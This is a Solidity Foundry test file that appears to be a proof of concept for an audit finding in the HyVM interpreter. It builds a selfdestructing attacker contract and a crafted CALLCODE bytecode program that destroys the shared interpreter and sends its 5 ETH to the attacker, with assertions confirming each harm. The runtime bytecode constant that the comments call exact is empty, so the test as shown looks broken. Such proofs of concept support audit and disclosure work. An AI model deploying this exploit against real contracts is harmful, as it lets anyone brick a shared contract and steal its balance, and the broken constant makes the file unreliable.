pragma solidity 0.8.19;

import "forge-std/Test.sol";

/// TOB-NESTED (Trail of Bits, 2023-02, Nested Finance HyVM security review),
/// AuditVault finding #29663: "Unprotected callcode allows anyone to destroy the
/// HyVM master contract".
///
/// HyVM is a Huff EVM interpreter: its calldata IS an EVM-bytecode program that it
/// executes opcode-by-opcode. The audited op_callcode handler runs a real CALLCODE
/// with NO restriction (CHECK_CALLCODE() is empty in the deployed no-verifier build).
/// Because CALLCODE executes the callee's code in the CALLER's context, a program
/// that CALLCODEs a contract whose code runs SELFDESTRUCT destroys the HyVM master
/// itself. Any account can submit such a program and permanently brick the shared
/// interpreter for every user (and drain its balance).
///
/// HYVM_MASTER_RUNTIME below is the EXACT runtime bytecode of the audited, deployed
/// HyVM master at 0xCB70efa43300Cd9B7eF4ed2087ceA7f7f6f3c195 (Nested Finance,
/// commit NestedFi/HyVM@4e760d4 "deploy: 0xCB70efa4...", op_callcode at HyVM.huff#L682
/// -- exactly Figure 1.1 in the ToB report). Fetched via eth_getCode from mainnet.
/// The interpreter is deployed unmodified and the real exploit is executed against it.

/// @dev Minimal deployer: returns the real HyVM master runtime as its own code, so a
///      normal CREATE gives us the audited interpreter at a fresh address.
contract HyVMMasterDeployer {
    constructor(bytes memory runtime) {
        assembly { return(add(runtime, 0x20), mload(runtime)) }
    }
}

/// @dev Attacker-controlled target. Under CALLCODE this code executes in the HyVM
///      master's context, so SELFDESTRUCT destroys the HyVM master and forwards its
///      balance to `beneficiary` (the attacker).
contract Destroyer {
    address payable immutable beneficiary;
    constructor(address payable b) { beneficiary = b; }
    fallback() external payable { selfdestruct(beneficiary); }
}

contract PoC_29663_HyVM_Callcode_Selfdestruct is Test {
    /// Real audited, deployed HyVM master runtime bytecode (mainnet 0xCB70efa4...).
    bytes internal constant HYVM_MASTER_RUNTIME = hex"";

    address internal attacker = address(0xA11CE);
    address internal hyvm;
    uint256 internal codeLenAtDeploy;

    function _deployHyVM() internal returns (address a) {
        a = address(new HyVMMasterDeployer(HYVM_MASTER_RUNTIME));
    }

    /// The exploit runs in setUp so that Foundry finalizes the SELFDESTRUCT (which is
    /// deferred to end-of-transaction under the audited-era Paris semantics) BEFORE the
    /// assertions in the test body observe the destroyed master.
    function setUp() public {
        hyvm = _deployHyVM();
        codeLenAtDeploy = hyvm.code.length;

        // The HyVM master holds 5 ETH (e.g. mid-operation value / fee balance).
        vm.deal(hyvm, 5 ether);

        // Sanity: the real interpreter executes a benign program (PUSH1 0x2a; STOP).
        (bool okBenign, ) = hyvm.call(hex"602a00");
        require(okBenign, "HyVM must interpret a benign program");

        // Attacker's malicious contract: its code SELFDESTRUCTs to the attacker.
        Destroyer d = new Destroyer(payable(attacker));

        // Craft the HyVM program (plain EVM bytecode) that performs
        // CALLCODE(gas, address(d), value=0, argsOffset=0, argsSize=0, retOffset=0, retSize=0):
        //   PUSH1 0x00 x5  (retSize, retOffset, argsSize, argsOffset, value)
        //   PUSH20 <d>     (target address)
        //   GAS            (forward all gas -> on top of stack)
        //   CALLCODE (0xf2)
        //   STOP (0x00)
        bytes memory program = abi.encodePacked(
            hex"6000600060006000600073", // 5x PUSH1 0x00 ; PUSH20
            address(d),
            hex"5af200"                  // GAS ; CALLCODE ; STOP
        );

        // Anyone can submit this program. HyVM's unprotected op_callcode CALLCODEs the
        // Destroyer, whose SELFDESTRUCT then runs in the HyVM master's context.
        vm.prank(attacker);
        (bool ok, ) = hyvm.call(program);
        require(ok, "malicious callcode program must be accepted by HyVM");
    }

    function test_anyone_can_destroy_the_hyvm_master() public {
        // Harm 1 -- the shared HyVM master interpreter is DESTROYED (code wiped).
        assertGt(codeLenAtDeploy, 0, "master should have been deployed with real code");
        assertEq(hyvm.code.length, 0, "HARM: HyVM master code destroyed (interpreter bricked)");

        // Harm 2 -- the master's 5 ETH balance was stolen by the attacker.
        assertEq(hyvm.balance, 0, "HARM: HyVM master balance drained");
        assertEq(attacker.balance, 5 ether, "HARM: attacker received the master's balance");

        // Harm 3 -- exactly the ToB scenario: a subsequent legit HyVM payload now
        // "succeeds but executes nothing" (call to a code-less account is a no-op).
        (bool ok, bytes memory ret) = hyvm.call(hex"602a00");
        assertTrue(ok, "call to destroyed master returns success...");
        assertEq(ret.length, 0, "...but executes no code (users' operations silently no-op)");
    }
}
